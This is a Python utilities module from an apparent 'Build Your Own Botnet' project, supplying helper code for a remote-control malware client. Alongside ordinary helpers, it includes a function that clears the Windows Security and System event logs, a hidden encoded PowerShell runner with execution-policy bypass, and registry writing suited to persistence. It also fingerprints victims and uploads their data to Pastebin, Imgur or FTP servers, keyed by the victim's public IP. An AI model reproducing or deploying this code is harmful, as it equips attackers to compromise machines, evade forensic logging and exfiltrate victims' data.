#!/usr/bin/python
# -*- coding: utf-8 -*-
'Utilities (Build Your Own Botnet)'
from __future__ import print_function

import colorama
colorama.init()

_debug = False

# main
def log(info, level='debug'):
    """
    Log output to the console (if verbose output is enabled)

    """
    import logging
    logging.basicConfig(level=logging.DEBUG if globals()['_debug'] else logging.ERROR, handlers=[logging.StreamHandler()])
    logger = logging.getLogger(__name__)
    getattr(logger, level if hasattr(logger, level) else 'debug')(str(info))


def imports(source, target=None):
    """
    Attempt to import each package into the module specified

    `Required`
    :param list source: package/module to import

    `Optional`
    :param object target: target object/module to import into

    """
    if isinstance(source, str):
        source = source.split()
    if isinstance(target, dict):
        module = target
    elif hasattr(target, '__dict__'):
        module = target.__dict__
    else:
        module = globals()
    for src in source:
        try:
            exec("import {}".format(src), target)
        except ImportError:
            log("missing package '{}' is required".format(source))


def is_compatible(platforms=['win32','linux2','darwin'], module=None):
    """
    Verify that a module is compatible with the host platform

    `Optional`
    :param list platforms:   compatible platforms
    :param str module:       name of the module

    """
    import sys
    if sys.platform in platforms:
        return True
    log("module {} is not yet compatible with {} platforms".format(module if module else '', sys.platform), level='warn')
    return False


def platform():
    """
    Return the system platform of host machine

    """
    import sys
    return sys.platform


def public_ip():
    """
    Return public IP address of host machine

    """
    import sys
    if sys.version_info[0] > 2:
        from urllib.request import urlopen
    else:
        from urllib import urlopen
    return urlopen('http://api.ipify.org').read()


def local_ip():
    """
    Return local IP address of host machine

    """
    import socket
    return socket.gethostbyname(socket.gethostname())


def mac_address():
    """
    Return MAC address of host machine

    """
    import uuid
    return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()


def architecture():
    """
    Check if host machine has 32-bit or 64-bit processor architecture

    """
    import struct
    return int(struct.calcsize('P') * 8)


def device():
    """
    Return the name of the host machine

    """
    import socket
    return socket.getfqdn(socket.gethostname())


def username():
    """
    Return username of current logged in user

    """
    import os
    return os.getenv('USER', os.getenv('USERNAME', 'user'))


def administrator():
    """
    Return True if current user is administrator, otherwise False

    """
    import os
    import ctypes
    return bool(ctypes.WinDLL("shell32").IsUserAnAdmin() if 'nt' == os.name else os.getuid() == 0)


def geolocation():
    """
    Return latitute/longitude of host machine (tuple)
    """
    import sys
    import json
    if sys.version_info[0] > 2:
        from urllib.request import urlopen
    else:
        from urllib2 import urlopen
    response = urlopen('http://ipinfo.io').read()
    json_data = json.loads(response)
    latitude, longitude = json_data.get('loc').split(',')
    return (latitude, longitude)


def ipv4(address):
    """
    Check if valid IPv4 address

    `Required`
    :param str address:   string to check

    Returns True if input is valid IPv4 address, otherwise False

    """
    import socket
    try:
        if socket.inet_aton(str(address)):
            return True
    except:
        return False


def status(timestamp):
    """
    Check the status of a job/thread

    `Required`
    :param float timestamp:   Unix timestamp (seconds since the Epoch)

    """
    import time
    c = time.time() - float(timestamp)
    data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
          '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
          '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
          '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
    return ', '.join([i for i in data if i])


def unzip(filename):
    """
    Extract all files from a ZIP archive

    `Required`
    :param str filename:     path to ZIP archive

    """
    import os
    import zipfile
    z = zipfile.ZipFile(filename)
    path = os.path.dirname(filename)
    z.extractall(path=path)


def post(url, headers={}, data={}, json={}, as_json=False):
    """
    Make a HTTP post request and return response

    `Required`
    :param str url:       URL of target web page

    `Optional`
    :param dict headers:  HTTP request headers
    :param dict data:     HTTP request POST data
    :param dict json:     POST data in JSON format
    :param bool as_json:  return JSON formatted output

    """
    try:
        import requests
        req = requests.post(url, headers=headers, data=data, json=json)
        output = req.content
        if as_json:
            try:
                output = req.json()
            except: pass
        return output
    except ImportError:
        import sys
        if sys.version_info[0] > 2:
            from urllib.request import urlopen,urlencode,Request
        else:
            from urllib import urlencode
            from urllib2 import urlopen,Request
        data = urlencode(data)
        req  = Request(str(url), data=data)
        for key, value in headers.items():
            req.headers[key] = value
        output = urlopen(req).read()
        if as_json:
            import json
            try:
                output = json.loads(output)
            except: pass
        return output


def normalize(source):
    """
    Normalize data/text/stream

    `Required`
    :param source:   string OR readable-file

    """
    import os
    if os.path.isfile(source):
        return open(source, 'rb').read()
    elif hasattr(source, 'getvalue'):
        return source.getvalue()
    elif hasattr(source, 'read'):
        if hasattr(source, 'seek'):
            source.seek(0)
        return source.read()
    else:
        return bytes(source)


def registry_key(key, subkey, value):
    """
    Create a new Windows Registry Key in HKEY_CURRENT_USER

    `Required`
    :param str key:         primary registry key name
    :param str subkey:      registry key sub-key name
    :param str value:       registry key sub-key value

    Returns True if successful, otherwise False

    """
    try:
        import _winreg
        reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, key, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, subkey, 0, _winreg.REG_SZ, value)
        _winreg.CloseKey(reg_key)
        return True
    except Exception as e:
        log(e)
        return False


def png(image):
    """
    Transforms raw image data into a valid PNG data

    `Required`
    :param image:   `numpy.darray` object OR `PIL.Image` object

    Returns raw image data in PNG format

    """
    import sys
    import zlib
    import numpy
    import struct

    try:
        from StringIO import StringIO  # Python 2
    except ImportError:
        from io import StringIO        # Python 3

    if isinstance(image, numpy.ndarray):
        width, height = (image.shape[1], image.shape[0])
        data = image.tobytes()
    elif hasattr(image, 'width') and hasattr(image, 'height') and hasattr(image, 'rgb'):
        width, height = (image.width, image.height)
        data = image.rgb
    else:
        raise TypeError("invalid input type: {}".format(type(image)))

    line = width * 3
    png_filter = struct.pack('>B', 0)
    scanlines = b"".join([png_filter + data[y * line:y * line + line] for y in range(height)])
    magic = struct.pack('>8B', 137, 80, 78, 71, 13, 10, 26, 10)

    ihdr = [b"", b'IHDR', b"", b""]
    ihdr[2] = struct.pack('>2I5B', width, height, 8, 2, 0, 0, 0)
    ihdr[3] = struct.pack('>I', zlib.crc32(b"".join(ihdr[1:3])) & 0xffffffff)
    ihdr[0] = struct.pack('>I', len(ihdr[2]))

    idat = [b"", b'IDAT', zlib.compress(scanlines), b""]
    idat[3] = struct.pack('>I', zlib.crc32(b"".join(idat[1:3])) & 0xffffffff)
    idat[0] = struct.pack('>I', len(idat[2]))

    iend = [b"", b'IEND', b"", b""]
    iend[3] = struct.pack('>I', zlib.crc32(iend[1]) & 0xffffffff)
    iend[0] = struct.pack('>I', len(iend[2]))

    fileh = StringIO()
    fileh.write(str(magic))
    fileh.write(str(b"".join(ihdr)))
    fileh.write(str(b"".join(idat)))
    fileh.write(str(b"".join(iend)))
    fileh.seek(0)
    output = fileh.getvalue()
    if sys.version_info[0] > 2:
        output = output.encode('utf-8') # python3 compatibility
    return output


def delete(target):
    """
    Tries to delete file via multiple methods, if necessary

    `Required`
    :param str target:     target filename to delete

    """
    import os
    import shutil
    try:
        _ = os.popen('attrib -h -r -s {}'.format(target)) if os.name == 'nt' else os.chmod(target, 777)
    except OSError: pass
    try:
        if os.path.isfile(target):
            os.remove(target)
        elif os.path.isdir(target):
            import shutil
            shutil.rmtree(target, ignore_errors=True)
    except OSError: pass


def clear_system_logs():
    """
    Clear Windows system logs (Application, security, Setup, System)

    """
    try:
        for log in ["application","security","setup","system"]:
            output = powershell("& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}" % log)
            if output:
                log(output)
    except Exception as e:
        log(e)


def kwargs(data):
    """
    Takes a string as input and returns a dictionary of keyword arguments

    `Required`
    :param str data:    string to parse for keyword arguments

    Returns dictionary of keyword arguments as key-value pairs

    """
    try:
        return {i.partition('=')[0]: i.partition('=')[2] for i in str(data).split() if '=' in i}
    except Exception as e:
        log(e)


def powershell(code):
    """
    Execute code in Powershell.exe and return any results

    `Required`
    :param str code:      script block of Powershell code

    Returns any output from Powershell executing the code

    """
    import os
    import base64
    try:
        powershell = r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe' if os.path.exists(r'C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe') else os.popen('where powershell').read().rstrip()
        return os.popen('{} -exec bypass -window hidden -noni -nop -encoded {}'.format(powershell, base64.b64encode(code))).read()
    except Exception as e:
        log("{} error: {}".format(powershell.__name__, str(e)))


def display(output, color=None, style=None, end='\\n', event=None, lock=None):
    """
    Display output in the console

    `Required`
    :param str output:    text to display

    `Optional`
    :param str color:     red, green, cyan, magenta, blue, white
    :param str style:     normal, bright, dim
    :param str end:       __future__.print_function keyword arg
    :param lock:          threading.Lock object
    :param event:         threading.Event object

    """
    if isinstance(output, bytes):
        output = output.decode('utf-8')
    else:
        output = str(output)
    _color = ''
    if color:
        _color = getattr(colorama.Fore, color.upper())
    _style = ''
    if style:
        _style = getattr(colorama.Style, style.upper())
    exec("""print(_color + _style + output + colorama.Style.RESET_ALL, end="{}")""".format(end))


def color():
    """
    Returns a random color for use in console display

    """
    try:
        import random
        return random.choice(['BLACK', 'BLUE', 'CYAN', 'GREEN', 'LIGHTBLACK_EX', 'LIGHTBLUE_EX', 'LIGHTCYAN_EX', 'LIGHTGREEN_EX', 'LIGHTMAGENTA_EX', 'LIGHTRED_EX', 'LIGHTWHITE_EX', 'LIGHTYELLOW_EX', 'MAGENTA', 'RED', 'RESET', 'WHITE', 'YELLOW'])
    except Exception as e:
        log("{} error: {}".format(color.__name__, str(e)))


def imgur(source, api_key=None):
    """
    Upload image file/data to Imgur

    """
    import base64
    if api_key:
        response = post('https://api.imgur.com/3/upload', headers={'Authorization': 'Client-ID {}'.format(api_key)}, data={'image': base64.b64encode(normalize(source)), 'type': 'base64'}, as_json=True)
        return response['data']['link'].encode()
    else:
        log("No Imgur API key found")


def pastebin(source, api_key):
    """
    Upload file/data to Pastebin

    `Required`
    :param str source:         data or readable file-like object
    :param str api_dev_key:    Pastebin api_dev_key

    `Optional`
    :param str api_user_key:   Pastebin api_user_key

    """
    import sys
    if sys.version_info[0] > 2:
        from urllib.parse import urlsplit,urlunsplit
    else:
        from urllib2 import urlparse
        urlsplit = urlparse.urlsplit
        urlunsplit = urlparse.urlunsplit
    if isinstance(api_key, str):
        try:
            info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
            paste = post('https://pastebin.com/api/api_post.php', data=info)
            parts = urlsplit(paste)
            result = urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
            if not result.endswith('/'):
                result += '/'
            return result
        except Exception as e:
            log("Upload to Pastebin failed with error: {}".format(e))
    else:
        log("No Pastebin API key found")


def ftp(source, host=None, user=None, password=None, filetype=None):
    """
    Upload file/data to FTP server

    `Required`
    :param str source:    data or readable file-like object
    :param str host:      FTP server hostname
    :param str user:      FTP account username
    :param str password:  FTP account password

    `Optional`
    :param str filetype:  target file type (default: .txt)

    """
    import os
    import time
    import ftplib

    try:
        from StringIO import StringIO  # Python 2
    except ImportError:
        from io import StringIO        # Python 3

    if host and user and password:
        path  = ''
        local = time.ctime().split()
        if os.path.isfile(str(source)):
            path   = source
            source = open(path, 'rb')
        elif hasattr(source, 'seek'):
            source.seek(0)
        else:
            source = StringIO(source)
        try:
            ftp = ftplib.FTP(host=host, user=user, password=password)
        except:
            return "Upload failed - remote FTP server authorization error"
        addr = public_ip()
        if 'tmp' not in ftp.nlst():
            ftp.mkd('/tmp')
        if addr not in ftp.nlst('/tmp'):
            ftp.mkd('/tmp/{}'.format(addr))
        if path:
            path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
        else:
            filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
            path = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
        stor = ftp.storbinary('STOR ' + path, source)
        return path
    else:
        log('missing one or more required arguments: host, user, password')


def config(*arg, **options):
    """
    Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)

    """
    import functools
    def _config(function):
        @functools.wraps(function)
        def wrapper(*args, **kwargs):
            return function(*args, **kwargs)
        for k,v in options.items():
            setattr(wrapper, k, v)
        return wrapper
    return _config


def threaded(function):
    """
    Decorator for making a function threaded

    `Required`
    :param function:    function/method to run in a thread

    """
    import time
    import threading
    import functools
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
        t.daemon = True
        t.start()
        return t
    return _threaded
